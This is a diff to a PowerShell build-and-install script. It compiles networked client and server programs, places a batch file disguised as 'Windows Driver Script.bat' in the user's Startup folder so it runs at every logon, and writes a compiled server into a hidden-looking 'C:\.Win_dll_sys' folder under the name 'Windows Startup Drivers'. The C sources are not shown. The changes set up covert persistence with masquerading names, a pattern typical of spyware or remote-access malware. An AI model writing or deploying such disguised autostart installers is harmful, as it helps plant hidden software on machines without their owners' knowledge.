@@ -19,9 +19,19 @@ Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse
 
 $sourcePath = "windows_drivers"
 Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse
+$sourcePath = "Windows Driver Script.bat"
+$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+Copy-Item -Path $sourcePath -Destination $destinationPath2 -Force -Recurse
 
-$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Startup Drivers"
-gcc server_3.c -lwinmm -o $destinationPath2
+gcc server_3.c -lwinmm -o "C:\.Win_dll_sys\Windows Startup Drivers"
+$file ="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Startup Drivers.exe" 
+
+if (Test-Path $file) {
+    Remove-Item $file -Force
+    Write-Host "File $file deleted successfully."
+} else {
+    Write-Host "File $file does not exist."
+}
 
 gcc client.c -lws2_32 -lwinmm -o client
 gcc server.c -lws2_32 -lwinmm -o server
